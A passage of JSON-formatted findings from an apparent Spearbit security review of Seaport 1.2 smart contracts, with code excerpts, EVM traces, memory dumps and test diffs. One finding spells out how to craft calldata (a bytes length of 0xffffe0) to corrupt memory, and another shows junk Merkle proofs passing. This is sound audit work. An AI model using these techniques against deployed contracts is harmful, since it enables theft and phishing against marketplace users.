to Seaport, they might use indices that would turn to be out of range for the consideration in question after the modification applied for the contract offerer above. If this happens, the whole call will be reverted. This issue is in the same category as Advance orders of CONTRACT order types can generate orders with different consideration recipients that would break the aggregation routine.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "AdvancedOrder.numerator and AdvancedOrder.denominator are unchecked for orders of CONTRACT or- der type", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "For most advanced order types, we have the following check: // Read numerator and denominator from memory and place on the stack. uint256 numerator = uint256(advancedOrder.numerator); uint256 denominator = uint256(advancedOrder.denominator); // Ensure that the supplied numerator and denominator are valid. if (numerator > denominator || numerator == 0) { _revertBadFraction(); } For CONTRACT order types this check is skipped. For later calculations (calculating the current amount) Seaport uses the numerator and denominator returned by _getGeneratedOrder which as a pair it's either (1, 1) or (0, 0). advancedOrder.numerator is only used to skip certain operations in some loops when it is 0:  Skip applying criteria resolvers. 10  Skip aggregating the amount for executions.  Skip the final validity check. Skipping the above operations would make sense. But when for an advancedOrder with CONTRACT order type _get- GeneratedOrder returns (h, 1, 1) and advancedOrder.numerator == 0, we would skip applying criteria resolvers, aggregating the amounts from offer or consideration amounts for this order and skip the final validity check that would call into the ratifyOrder endpoint of the offerer. But emiting the following OrderFulfilled will not be skipped, even though this advancedOrder will not be used. // Emit an OrderFulfilled event. _emitOrderFulfilledEvent( orderHash, orderParameters.offerer, orderParameters.zone, recipient, orderParameters.offer, orderParameters.consideration ); This can create discrepancies between what happens on chain and what off-chain agents index/record.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "Calls to PausableZone's executeMatchAdvancedOrders and executeMatchOrders would revert if un- used native tokens would need to be returned", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In match (advanced) orders, one can provide native tokens as offer and consideration items. So a PausableZone would need to provide msg.value to call the corresponding Seaport endpoints. There are a few scenarios where not all the msg.value native tokens amount provided to the Seaport marketplace will be used: 1. Rounding errors in calculating the current amount of offer or consideration items. The zone can prevent send- ing extra native tokens to Seaport by pre-calculating these values and making sure to have its transaction to be included in the specific block that these values were calculated for (this is important when the start and end amount of an item are not equal). 2. The zone (un)intentionally sends more native tokens that it is necessary to Seaport. 3. The (advanced) orders sent for matching in Seaport include order type of CONTRACT offerer order and the of- ferer contract provides different amount for at least one item that would eventually make the whole transaction not use the full amount of msg.value provided to it. In all these cases, since PausableZone does not have a receive or fallback endpoint to accept native tokens, when Seaport tries to send back the unsued native token amount the transaction may revert. PausableZone not accepting native tokens: $ export CODE=$(jq -r '.deployedBytecode' artifacts/contracts/zones/PausableZone.sol/PausableZone.json | tr -d '\\n') ,! $ evm --code $CODE --value 1 --prestate genesis.json --sender ,! 0xb4d0000000000000000000000000000000000000 --nomemory=false --debug run $ evm --input $(echo $CODE | head -c 44 - | sed -E s/0x//) disasm 6080806040526004908136101561001557600080fd 00000: PUSH1 0x80 00002: DUP1 00003: PUSH1 0x40 00005: MSTORE 00006: PUSH1 0x04 00008: SWAP1 00009: DUP2 0000a: CALLDATASIZE 0000b: LT 0000c: ISZERO 0000d: PUSH2 0x0015 00010: JUMPI 00011: PUSH1 0x00 00013: DUP1 00014: REVERT trace of evm ... --debug run error: execution reverted #### TRACE #### PUSH1 pc=00000000 gas=4700000 cost=3 DUP1 pc=00000002 gas=4699997 cost=3 12 Stack: 00000000 0x80 PUSH1 Stack: 00000000 00000001 MSTORE Stack: 00000000 00000001 00000002 PUSH1 Stack: 00000000 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 SWAP1 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 DUP2 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 pc=00000003 gas=4699994 cost=3 pc=00000005 gas=4699991 cost=12 pc=00000006 gas=4699979 cost=3 0x80 0x80 0x40 0x80 0x80 0x80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000008 gas=4699976 cost=3 0x4 0x80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000009 gas=4699973 cost=3 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000010 gas=4699970 cost=2 0x4 0x80 0x4 CALLDATASIZE Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| 13 LT Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 ISZERO Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 PUSH2 Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 JUMPI Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 PUSH1 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 pc=00000011 gas=4699968 cost=3 0x0 0x4 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000012 gas=4699965 cost=3 0x1 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000013 gas=4699962 cost=3 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000016 gas=4699959 cost=10 0x15 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000017 gas=4699949 cost=3 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 14 00000030 00000040 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| DUP1 Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 REVERT Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 pc=00000019 gas=4699946 cost=3 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000020 gas=4699943 cost=0 0x0 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| #### LOGS #### genesis.json: { \"gasLimit\": \"4700000\", \"difficulty\": \"1\", \"alloc\": { \"0xb4d0000000000000000000000000000000000000\": { \"balance\": \"10000000000000000000000000\", \"code\": \"\", \"storage\": {} } } } // file: test/zone.spec.ts ... it(\"Fulfills an order with executeMatchAdvancedOrders with NATIVE Consideration Item\", async () => { const pausableZoneControllerFactory = await ethers.getContractFactory( \"PausableZoneController\", owner ); const pausableZoneController = await pausableZoneControllerFactory.deploy( owner.address ); // Deploy pausable zone const zoneAddr = await createZone(pausableZoneController); 15 // Mint NFTs for use in orders const nftId = await mintAndApprove721(seller, marketplaceContract.address); // Define orders const offerOne = [ getTestItem721(nftId, toBN(1), toBN(1), undefined, testERC721.address), ]; const considerationOne = [ getOfferOrConsiderationItem( 0, ethers.constants.AddressZero, toBN(0), parseEther(\"0.01\"), parseEther(\"0.01\"), seller.address ), ]; const { order: orderOne, orderHash: orderHashOne } = await createOrder( seller, zoneAddr, offerOne, considerationOne, 2 ); const offerTwo = [ getOfferOrConsiderationItem( 0, ethers.constants.AddressZero, toBN(0), parseEther(\"0.01\"), parseEther(\"0.01\"), undefined ), ]; const considerationTwo = [ getTestItem721( nftId, toBN(1), toBN(1), buyer.address, testERC721.address ), ]; const { order: orderTwo, orderHash: orderHashTwo } = await createOrder( buyer, zoneAddr, offerTwo, considerationTwo, 2 ); const fulfillments = [ [[[0, 0]], [[1, 0]]], [[[1, 0]], [[0, 0]]], ].map(([offerArr, considerationArr]) => toFulfillment(offerArr, considerationArr) ); // Perform the match advanced orders with zone const tx = await pausableZoneController .connect(owner) 16 .executeMatchAdvancedOrders( zoneAddr, marketplaceContract.address, [orderOne, orderTwo], [], fulfillments, { value: parseEther(\"0.01\").add(1) } // the extra 1 wei reverts the tx ); // Decode all events and get the order hashes const orderFulfilledEvents = await decodeEvents(tx, [ { eventName: \"OrderFulfilled\", contract: marketplaceContract }, ]); expect(orderFulfilledEvents.length).to.equal(fulfillments.length); // Check that the actual order hashes match those from the events, in order const actualOrderHashes = [orderHashOne, orderHashTwo]; orderFulfilledEvents.forEach((orderFulfilledEvent, i) => expect(orderFulfilledEvent.data.orderHash).to.be.equal( actualOrderHashes[i] ) ); }); ... This bug also applies to Seaport 1.1 and PausableZone (0x004C00500000aD104D7DBd00e3ae0A5C00560C00)", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "ABI decoding for bytes: memory can be corrupted by maliciously constructing the calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In the code snippet below, size can be made 0 by maliciously crafting the calldata. In this case, the free memory is not incremented. assembly { mPtrLength := mload(0x40) let size := and( add( and(calldataload(cdPtrLength), OffsetOrLengthMask), AlmostTwoWords ), OnlyFullWordMask ) calldatacopy(mPtrLength, cdPtrLength, size) mstore(0x40, add(mPtrLength, size)) } This has two different consequences: 1. If the memory offset mPtrLength is immediately used then junk values at that memory location can be interpreted as the decoded bytes type. In the case of Seaport 1.2, the likelihood of the current free memory pointing to junk value is low. So, this case has low severity. 17 2. The consequent memory allocation will also use the value mPtrLength to store data in memory. This can lead to corrupting the initial memory data. In the worst case, the next allocation can be tuned so that the first bytes data can be any arbitrary data. To make the size calculation return 0: 1. Find a function call which has bytes as a (nested) parameter. 2. Modify the calldata field where the length of the above byte is stored to the new length 0xffffe0. 3. The calculation will now return size = 0. Note: there is an additional requirement that this bytes type should be inside a dynamic struct. Otherwise, for example, in case of function foo(bytes calldata signature) , the compiler will insert a check that calldata- size is big enough to fit signature.length. Since the value 0xffffe0 is too big to be fit into calldata, such an attack is impractical. However, for bytes type inside a dynamic type, for example in function foo(bytes[] calldata signature), this check is skipped by solc (likely because it's expensive). For a practical exploit we need to look for such function. In case of Seaport 1.2 this could be the matchAdvancedOrders(AdvancedOrder[] calldata orders, ...) function. The struct AdvancedOrder has a nested parameter bytes signature as well as bytes extraData. In the above exploit one would be able to maliciously modify the calldata in such a way that Seaport would interpret the data in extraData as the signature. Here is a proof of concept for a simplified case that showcases injecting an arbitrary value into a decoded bytes. As for severity, even though interpreting calldata differently may not fundamentally break the protocol, an attacker with enough effort may be able to use this for subtle phishing attacks or as a precursor to other attacks.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "Advance orders of CONTRACT order types can generate orders with different consideration recipients that would break the aggregation routine", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When Seaport receives a collection of advanced orders to match or fulfill, if one of the orders has a CONTRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. genera- teOrder(...) can provide new consideration item recipients for this order. These new recipients are going to be used for this order from this point on. In _getGeneratedOrder, there is no comparison between old or new consideration recipients. The provided new recipients can create an issue when aggregating consideration items. Since the fulfillment data is provided beforehand by the caller of the Seaport endpoint, the caller might have provided fulfillment aggregation data that would have aggregated/combined one of the consideration items of this changed advance order with another consideration item. But the aggregation had taken into consideration the original recipient of the order in question. Multiple consideration items can only be aggregated if they share the same itemType, token, identi- fier, and recipient (ref). The new recipients provided by the contract offerer can break this invariant and in turn cause a revert.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "CriteriaResolvers.criteriaProof is not validated in the identifierOrCriteria == 0 case", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In the case of identifierOrCriteria == 0, the criteria resolver completely skips any validations on the Merkle proof and in particular is missing the validation that CriteriaResolvers.criteriaProof.length == 0. Note: This is also present in Seaport 1.1 and may be a known issue. Proof of concept: modified @@ -3568,9 +3568,8 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { test/advanced.spec.ts // Seller approves marketplace contract to transfer NFTs await set1155ApprovalForAll(seller, marketplaceContract.address, true); - - + const { root, proofs } = merkleTree([nftId]); const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))]; const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))]; const consideration = [ getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address), @@ -3578,8 +3577,9 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address), ]; + - + // Add a junk criteria proof and the test still passes const criteriaResolvers = [ buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]), buildResolver(0, 0, 0, nftId, ,! [\"0xdead000000000000000000000000000000000000000000000000000000000000\"]), ]; const { order, orderHash, value } = await createOrder(", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "Calls to TypehashDirectory will be successful", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "TypehashDirectory's deployed bytecode starts with 00 which corresponds to STOP opcode (SSTORE2 also uses this pattern). This choice for the 1st bytecode causes accidental calls to the contract to succeed silently.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "_isValidBulkOrderSize does not perform the signature length validation correctly.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In _isValidBulkOrderSize the signature's length validation is performed as follows: let length := mload(signature) validLength := and( lt(length, BulkOrderProof_excessSize), lt(and(sub(length, BulkOrderProof_minSize), AlmostOneWord), 2) ) The sub opcode in the above snippet wraps around. If this was the correct formula then it would actually simplify to: lt(and(sub(length, 3), AlmostOneWord), 2) The simplified and the current version would allow length to also be 3, 4, 35, 36, 67, 68 but _isValidBulkOrder- Size actually needs to check that length ( l ) has the following form: where x 2 f0, 1g and y 2 f1, 2, (cid:1) (cid:1) (cid:1) , 24g ( y represents the height/depth of the bulk order).", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "When contractNonce occupies more than 12 bytes the truncated nonce shared back with the contract offerer through ratifyOrder would be smaller than the actual stored nonce", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When contractNonce occupies more than 12 bytes the truncated nonce shared back with the con- tract offerer through ratifyOrder would be smaller than the actual stored nonce: // Write contractNonce to calldata dstHead.offset(ratifyOrder_contractNonce_offset).write( uint96(uint256(orderHash)) ); This is due to the way the contractNonce and the offerer's address are mixed in the orderHash: assembly { orderHash := or(contractNonce, shl(0x60, offerer)) }", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "abi_decode_bytes does not mask the copied data length", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When abi_decode_bytes decodes bytes, it does not mask the copied length of the data in memory (other places where the length is masked by OffsetOrLengthMask).", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "OrderHash in the context of contract orders need not refer to a unique order", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In Seaport 1.1 and in Seaport 1.2 for non-contract orders, order hashes have a unique correspon- dence with the order, i.e., it can be used to identify the status of an order on-chain and track it. However, in case of contract orders, this is not the case. It is simply the current nonce of the offerer, combined with the address. This cannot be used to uniquely track an order on-chain. uint256 contractNonce; unchecked { contractNonce = _contractNonces[offerer]++; } assembly { orderHash := or(contractNonce, shl(0x60, offerer)) } Here are some example scenarios where this can be problematic: Scenario 1: A reverted contract order and the adjacent succeeding contract order will have the same order hash, regardless of whether they correspond to the same order. 1. Consider Alice calling fulfilledAdvancedOrder for a contract order with offerer = X, where X is a smart contract that offers contract orders on Seaport 1.2. Assume that this transaction failed because enough gas was not provided for the generateOrder call. This tx would revert with a custom error InvalidContrac- tOrder, generated from OrderValidator.sol#L391. 22 2. Consider Bob calling fulfilledAdvancedOrder for a different contract order with offerer = X, same smart contract offerer. OrderFulfiller.sol#L124 This order will succeed and emit the OrderFulfilled event the from In the above scenario, there are two different orders, one that reverted on-chain and the other that succeeded, both having the same orderHash despite the orders only sharing the same contract offerer--the other parameters can be completely arbitrary. Scenario 2: Contract order hashes computed off-chain can be misleading. 1. Consider Alice calling fulfilledAdvancedOrder for a contract order with offerer = X, where X is a smart contract that offers contract orders on Seaport 1.2. Alice computed the orderHash of their order off-chain by simulating the transaction, sends the transaction and polls the OrderFulfilled event with the same orderHash to know if the order has been fulfilled. 2. Consider Bob calling fulfilledAdvancedOrder for any contract order with offerer = X, the same smart contract offerer. 3. Bob's transaction gets included first. An OrderFulfilled event is emitted, with the orderHash to be the same hash that Alice computed off-chain! Alice may believe that their order succeeded. for non-contract Orders, the above approach would be valid, i.e., one may generate and sign an order, Note: compute the order hash of an order off-chain and poll for an OrderFulfilled with the order hash to know that it was fulfilled. Note: even though there is an easier way to track if the order succeeded in these cases, in the general case, Alice or Bob need not be the one executing the orders on-chain. And an off-chain agent may send misleading notifications to either parties that their order succeeded due to this quirk with contract order hashes.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "When _contractNonces[offerer] gets updated no event is emitted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When _contractNonces[offerer] gets updated no event is emitted. This is in contrast to when a counter is updated. One might be able to extract the _contractNonces[offerer] (if it doesn't overflow 12 bytes to enter into the offerer region in the orderhash) from a later event when OrderFulfilled gets emited. OrderFulfilled only gets emitted for an order of CONTRACT type if the generateOrder(...)'s return data satisffies all the constraints.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "In general a contract offerer or a zone cannot draw a conclusion accurately based on the spent offer amounts or received consideration amounts shared with them post-trasnfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When one calls one of the Seaport endpoints that fulfills or matches a collection of (advanced) orders, the used offer or consideration items will go through different modification steps in the memory. In particular, the startAmount a of these items is an important parameter to inspect: a ! a0 ! b ! a0 a : original startAmount parameter shared to Seaport by the caller encoded in the memory. a0 : the interpolated value and for orders of CONTRACT order type it is the value returned by the contract offerer (interpolation does not have an effect in this case since the startAmount and endAmount are enforced to be equal). b : must be 0 for used consideration items, otherwise the call would revert. For offer items, it can be in [0, 1) (See The spent offer item amounts shared with a zone for restricted (advanced) orders or with a contract offerer for orders of CONTRACT order type is not the actual spent amount in general). a0 : is the final amount shared by Seaport to either a zone for restricted orders and a contract offerer for CONTRACT order types.  Offer Items For offer items, perhaps the zone or the contract offerer would like to check that the offerer has spent a maxi- mum a0 of that specific offer item. For the case of restricted orders where the zone's validateOrder(...) will be called, the offerer might end up spending more than a0 amount of a specific token with the same identifier if the collection of orders includes:  A mix of open and restricted orders.  Multiple zones for the same offerer, offering the same token with the same identifier.  Multiple orders using the same zone. In this case, the zone might not have a sense of the orders of the transfers or which orders are included in the transaction in question (unless the contexts used by the zone enforces the exact ordering and number of items that can be matched/fulfilled in the same transaction). Note the order of transfers can be manipulated/engineered by constructing specific fulfillment data. Given a fulfillment data to combine/aggregate orders, there could be permutations of it that create different ordering of the executions.  An order with an actor (a consideration recipient, contract offerer, weird token, ...) that has approval to transfer this specific offer item for the offerer in question. And when Seaport calls into (NATIVE, ERC1155 token transfers, ...) this actor, the actor would transfer the token to a different address than the offerer. There also is a special case where an order with the same offer item token and identifier is signed on a different instance of Seaport (1.0, 1.1, 1.2, ..., or other non-official versions) which an actor (a consideration recipient, con- tract offerer, weird token, ...) can cross-call into (related Cross-Seaport re-entrancy with the stateful validateOrder call). The above issue can be avoided if the offerer makes sure to not sign different transactions across different or the same instances of Seaport which 1. Share the same offer type, offer token, and offer identifier, 2. but differ in a mix of zone, and order type 24 3. can be active at a shared timestamp And/or the offerer does not give untrusted parties their token approvals. A similar issue can arise for a contract offerer if they use a mix of signed orders of non-CONTRACT order type and CONTRACT order types.  Consideration Items For consideration items, perhaps the zone or the contract offerer would like to check that the recipient of each consideration item has received a minimum of a0 of that specific consideration item. This case also is similar to the offer items issues above when a mix of orders has been used.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "Cross-Seaport re-entrancy with the stateful validateOrder call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The re-entrancy check in Seaport 1.2 will prevent the Zone from interacting with Seaport 1.2 again. However, an interesting scenario would happen when if the conduit has open channels to both Seaport 1.1 and Seaport 1.2 (or different deployments/forks of Seaport 1.2). This can lead to cross Seaport re-entrancy. This is not immediately problematic as Zones have limited functionality currently. But since Zones can be as flexible as possible, Zones need to be careful if they can interact with multiple versions of Seaport. Note: for Seaport 1.1's zone, the check _assertRestrictedBasicOrderValidity happens before the transfers, and it's also a staticcall. In the future, Seaport 1.3 could also have the same zone interaction, i.e., stateful calls to zones allowing for complex cross-Seaport re-entrancy between 1.2 and 1.3. Note: also see getOrderStatus and getContractOffererNonce are prone to view reentrancy for concerns around view-only re-entrancy.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "getOrderStatus and getContractOffererNonce are prone to view reentrancy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "Nonces[offerer] gets updated if there is a mix of contract offerer orders and partial orders are used, Seaport would call into the offerer contracts (let's call one of these offerer contracts X ). In turn X can be a contract that would call into other contracts (let's call them Y ) that take into consideration _orderStatus[orderHash] or _contractNonces[offerer] in their codebase by calling getOrderStatus or getContractOffererNonce The values for _orderStatus[orderHash] or _contractNonces[offerer] might get updated after Y seeks those from Seaport due to for example multiple partial orders with the same orderHash or multiple offerer contract orders using the same offerer. Therefore Y would only take into consideration the mid-flight values and not the final ones after the whole transaction with Seaport is completed.", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "The size calculation can be incorrect for large numbers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "The maximum value of memory offset is defined in PointerLibraries.sol#L22 as OffsetOr- LengthMask = 0xffffffff, i.e., 232 (cid:0) 1. However, the mask OnlyFullWordMask = 0xffffe0; is defined to be a 24-bit number. Assume that the length of the bytes type where src points is 0xffffe0, then the following piece of code incorrectly computes the size as 0. function abi_encode_bytes( MemoryPointer src, MemoryPointer dst ) internal view returns (uint256 size) { unchecked { size = ((src.readUint256() & OffsetOrLengthMask) + AlmostTwoWords) & OnlyFullWordMask; ... This is because the constant OnlyFullWordMask does not have the two higher order bytes set (as a 32-bit type). Note: in practice, it can be difficult to construct bytes of length 0xffffe0 due to upper bound defined by the block gas limit. However, this length is still below Seaport's OffsetOrLengthMask, and therefore may be able to evade many checks. 26", "labels": ["Spearbit", "Seaport", "Severity: Low Risk"]}, {"title": "_prepareBasicFulfillmentFromCalldata expands memory more than it's needed by 4 extra words", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "In _prepareBasicFulfillmentFromCalldata , we have: // Update the free memory pointer so that event data is persisted. mstore(0x40, add(0x80, add(eventDataPtr, dataSize))) OrderFulfilled's event data is stored in the memory in the region [eventDataPtr, eventDataPtr + dataSize). It's important to note that eventDataPtr is an absolute memory pointer and not a relative one. So the above 4 words, 0x80, in the snippet are extra. example, For in test/basic.spec.ts the Seaport memory profile at tract.connect(buyer).fulfillBasicOrder(basicOrderParameters, {value,}) looks like: \"ERC721 <=> ETH (basic, minimal and verified on-chain)\" case the call of marketplaceCon- the end of test the in 28 0x000 23b872dd000000000000000000000000f372379f3c48ad9994b46f36f879234a ; transferFrom.selector(from, to, id) ,! 0x020 27b4556100000000000000000000000016c53175c34f67c1d4dd0878435964c1 ; ... 0x040 0000000000000000000000000000000000000000000000000000000000000440 ; free memory pointer 0x060 0000000000000000000000000000000000000000000000000000000000000000 ; ZERO slot 0x080 fa445660b7e21515a59617fcd68910b487aa5808b8abda3d78bc85df364b2c2f ; orderTypeHash 0x0a0 000000000000000000000000f372379f3c48ad9994b46f36f879234a27b45561 ; offerer 0x0c0 0000000000000000000000000000000000000000000000000000000000000000 ; zone 0x0e0 78d24b64b38e96956003ddebb880ec8c1d01f333f5a4bfba07d65d5c550a3755 ; h(ho) 0x100 81c946a4f4982cb7ed0c258f32da6098760f98eaf6895d9ebbd8f9beccb293e7 ; h(hc, ha[0], ..., ha[n]) 0x120 0000000000000000000000000000000000000000000000000000000000000000 ; orderType 0x140 0000000000000000000000000000000000000000000000000000000000000000 ; startTime 0x160 000000000000000000000000000000000000ff00000000000000000000000000 ; endTime 0x180 8f1d378d2acd9d4f5883b3b9e85385cf909e7ab825b84f5a6eba28c31ea5246a ; zoneHash > orderHash 0x1a0 00000000000000000000000016c53175c34f67c1d4dd0878435964c1c9b70db7 ; salt > fulfiller 0x1c0 0000000000000000000000000000000000000000000000000000000000000080 ; offererConduitKey > offerer array head ,! 0x1e0 0000000000000000000000000000000000000000000000000000000000000120 ; counter[offerer] > consideration array head ,! 0x200 0000000000000000000000000000000000000000000000000000000000000001 ; h[4]? > offer.length 0x220 0000000000000000000000000000000000000000000000000000000000000002 ; h[...]? > offer.itemType 0x240 000000000000000000000000c67947dc8d7fd0c2f25264f9b9313689a4ac39aa ; > offer.token 0x260 00000000000000000000000000000000c02c1411443be3c204092b54976260b9 ; > offer.identifierOrCriteria 0x280 0000000000000000000000000000000000000000000000000000000000000001 ; > offer's current interpolated amount ,! 0x2a0 0000000000000000000000000000000000000000000000000000000000000001 ; > totalConsiderationRecipients + 1 ,! 0x2c0 0000000000000000000000000000000000000000000000000000000000000000 ; > receivedItemType 0x2e0 